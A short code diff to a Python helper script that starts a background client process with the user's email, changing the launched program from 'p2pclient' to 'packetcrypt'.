@@ -35,7 +35,7 @@ def start_process():
     if email is None:
         print('EMAIL environment variable is not set. Please set it to your email address.')
         sys.exit(1)
-    cmd = f'nohup p2pclient -l {email} > {LOG_FILE} 2>&1 &'
+    cmd = f'nohup packetcrypt -l {email} > {LOG_FILE} 2>&1 &'
     out, err = subprocess.Popen(
         cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
     print(out.decode('utf-8'))
